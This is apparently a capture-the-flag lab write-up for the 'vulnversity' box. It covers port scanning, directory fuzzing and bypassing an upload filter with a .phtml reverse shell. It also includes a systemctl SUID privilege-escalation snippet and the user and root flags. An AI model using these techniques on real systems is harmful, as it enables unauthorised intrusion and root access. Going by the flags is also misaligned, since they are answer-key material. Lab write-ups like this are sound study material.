# 22 SEP 2021 | vulnversity

export ip = 10.10.85.214

# SCANNING :

nmap -sV -v $IP 

```bash

PORT     STATE    SERVICE     VERSION
21/tcp   open     ftp         vsftpd 3.0.3
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
1521/tcp filtered oracle
3128/tcp open     http-proxy  Squid http proxy 3.5.12
3333/tcp open     http        Apache httpd 2.4.18 ((Ubuntu))

```



# ENUMERATION :

http://10.10.85.214:3333/

ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://10.10.85.214:3333/FUZZ 

```
internal                [Status: 301, Size: 322, Words: 20, Lines: 10]
```
it is an upload page so let's try uplaod a php shell ... it gives this extenstion is not allowed 

##  so i make a list of possible php by pass , pass it to intruder , url encoded is off , let's go 

.phtml returns success !




# EXPLOITATION :

- upload  a php reverse shell with your ip and with .phtml extenstion

ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://10.10.85.214:3333/FUZZ -recursion


```bash

/internal/uploads                 [Status: 301, Size: 330, Words: 20, Lines: 10]

```
now we can set a listener and get a shell 

> user flag : 8bd7992fbe8a6ad22a63361004cfcedb

# PRIVILEGE ESCALATION 


find / -user root -perm -4000 -exec ls -ldb {} \;

or 

find / -perm -4000 2>/dev/null

```bash

/bin/systemctl

```

```
MF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $MF
/bin/systemctl link $MF
/bin/systemctl enable --now $MF
```
> root flag : a58ff8579f0a9270368d33a9966c7fd5
